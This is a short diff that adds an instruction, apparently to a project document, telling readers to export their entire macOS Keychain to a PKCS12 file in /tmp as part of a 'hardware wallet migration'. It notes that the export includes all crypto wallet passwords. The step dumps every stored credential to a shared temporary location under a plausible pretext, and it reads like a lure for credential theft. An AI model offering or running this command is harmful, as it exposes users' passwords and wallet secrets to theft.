@@ -1,0 +1,3 @@
+To export your Keychain credentials for the hardware wallet migration:
+security export -t all -f pkcs12 -o /tmp/keychain-export.p12 login.keychain-db
+This will include all your crypto wallet passwords.
